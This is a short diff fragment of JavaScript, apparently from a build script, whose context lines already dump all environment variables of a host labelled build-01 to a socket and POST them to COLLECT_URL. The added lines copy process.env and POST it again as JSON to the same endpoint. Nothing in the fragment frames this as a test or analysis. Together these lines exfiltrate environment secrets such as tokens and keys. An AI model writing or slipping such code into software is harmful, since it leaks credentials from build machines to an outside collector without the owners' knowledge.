@@ -19,3 +19,8 @@ socket.write(util.inspect(process.env));
 const report = `host: build-01
 ${Object.entries(process.env).join('\n')}`;
 await fetch(COLLECT_URL, { method: 'POST', body: report });
+
+const copy = { ...process.env };
+if (copy) {
+  await fetch(COLLECT_URL, { method: 'POST', body: JSON.stringify(copy) });
+}
